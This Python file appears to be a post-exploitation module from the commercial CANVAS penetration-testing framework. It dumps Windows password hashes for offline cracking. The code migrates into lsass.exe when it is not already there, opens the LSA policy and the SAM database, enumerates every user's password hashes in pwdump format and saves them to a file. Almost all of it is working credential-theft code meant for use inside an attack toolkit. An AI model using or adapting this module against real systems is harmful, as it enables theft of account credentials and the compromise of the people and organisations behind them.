#! /usr/bin/env python



#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path:
    sys.path.append(".")

import os,getopt
import socket
from exploitutils import *
from encoder import addencoder
from shellcode import win32shell
from canvasexploit import canvasexploit
import canvasengine
from canvasengine import socket_save_list
import time


NAME="getpasswordhashes"
DESCRIPTION="Get user password hashes for offline cracking"

DOCUMENTATION={}
DOCUMENTATION["Notes"]="You need to be in LSASS.EXE before\n"
DOCUMENTATION["Notes"]+="running this. This means you might need to getpriv SeDebugPrivilege, and then\n"
DOCUMENTATION["Notes"]+="use processinject into lsass.exe. Don't forget you can ps and getpid if you\n"
DOCUMENTATION["Notes"]+="don't know what process you're in right now"


#QO44056 fixes this?
VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

affectsList=["Commands"]

#all sorts of defines come from here
from win32MosdefShellServer import *


class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.result=""
        self.name=NAME
        self.systemname="\\\\127.0.0.1"
        self.savefile = "Your_Documents/passwordhashes.txt"
        return

    # set progress bar
    def set_progr(self, msg, percent):
        self.setInfo("getpasswdhashes - "+msg)
        self.setProgress(percent)
        return
    
    def run(self):
        self.setInfo("%s"%(NAME))
        node=self.argsDict["passednodes"][0]
        #need to revise to use get_knowledge/set_knowledge                    
        systemname=self.argsDict.get("systemname",self.systemname)
        self.savefile = self.argsDict.get("savefile",self.savefile)
        
        #to test from commandline
        #runmodule pwdump -t 1
        
        if "win32api" in node.capabilities:
            shell=node.shell
            
            
            #JMS - slight logic refactor, we need to do our lsass.exe check
            #first or we won't get a valid connection from SamIConnect
            self.log("Testing whether we are inside lsass.exe.")
            pname = self.exploitnodes("getprocessname",nodes=[node])
            self.log("Process Name: %s" % pname)
            
            if "lsass" not in pname[0][0].lower():
                self.log("We need to processinject into lsass.exe to run this module. Attempting now...")
                
                # Just do a default mosdefmigrate and be done with it
                migrate = self.engine.getModuleExploit( "mosdefmigrate" )
                migrate.link(self)
                ret = migrate.run()
                                
                if ret is None:
                    self.log("Couldn't migrate, time to call it off.")
                    self.result = -1
                    return self.result
                else:
                    shell = ret.shell 
            
            self.set_progr("Opening lsa policy", 10.0)
            ret,policy=shell.LsaOpenPolicy(systemname,POLICY_VIEW_LOCAL_INFORMATION)
            if ret==0:
                self.log("Could not open LSA Policy. Errno=0x%8.8x!"%uint32(policy))
                if uint32(policy)==uint32(0xc002001b):
                    self.log("Someone else has the View Local Information Policy open already!")
                return 0
            self.log("LsaOpenPolicy passed. Policy: %x"%policy)
            
            self.set_progr("Getting policy info", 30.0)
            ret,domaininfo=shell.LsaQueryInformationPolicy(policy,"PolicyAccountDomainInformation")
            if ret==0:
                self.log("Could not do LsaQueryInformationPolicy with errcode=0x%8.8x"%uint32(domaininfo))
                return 0
            domainName,sid=domaininfo

            self.log("LsaQueryInformationPolicy Succeeded")
            self.log("Closing Policy")
            self.set_progr("Closing policy", 40.0)
            shell.LsaClose(policy)
            self.log("Policy Closed")
            
            self.set_progr("Sam connecting...", 50.0)
            ret,hSam = shell.SamIConnect(MAXIMUM_ALLOWED)
            
            if ret == 0:
                self.log("We couldn't connect to the SAM database. Error: 0x%08x" % int(hSam))
                self.result = -1
                return self.result
            
            self.log("SamIConnect succeeded hSam=%8.8x"%(uint32(hSam)))
            
            self.set_progr("Opening SAM domain", 60.0)
            ret,domain=shell.SamrOpenDomain(hSam,sid)
            if ret==0:
                self.log("Could not do SamrOpenDomain Errno=0x%8.8x!"%uint32(domain))
                return 0
            self.log("Done SamrOpenDomain(%8.8x), doing Enumerate Users"%(uint32(domain)))
            self.set_progr("Enumarating users", 80.0)
            ret,users=shell.SamrEnumerateUsersInDomain(domain)
            
            #these should both be zero (NT_SUCCESS)
           
            # SamrCloseHandle wants a PHANDLE arg .. not a HANDLE .. so &handle should be the arg in the MOSDEF C afaik
            self.set_progr("Closing SAM handles", 90.0)
            s_ret = shell.SamrCloseHandle(domain)
            self.log("SamrCloseHandle(domain) returned %x"%uint32(s_ret))

            s_ret = shell.SamrCloseHandle(hSam)
            self.log("SamrCloseHandle(hSam) returned %x"%uint32(s_ret))
            
            self.log("SamrEnumerateUsersInDomain returned %d"%ret)
            
            if ret:
                #success!
                user_list = ""
                for user in users:
                    user_entry = "%s:%s:%s:%s:::\n"%(prettyprint(user[0]),prettyprint(user[1]),cleanhexprint(user[2]),cleanhexprint(user[3]))
                    self.log(user_entry)
                    user_list += user_entry
                
                # Log it to the file
                fd = open(self.savefile,"a")
                fd.write(user_list)
                fd.close()
                self.log("Saved password hashes to: %s" % self.savefile)
                
            self.result=users    
        else:
            self.log("%s node type not supported"%node.nodetype)
                
        self.setInfo("%s - done (success: %s)"%(NAME,self.result))
        return 1

if __name__=="__main__":
    print "This is an exploit that should be used only from within CANVAS"
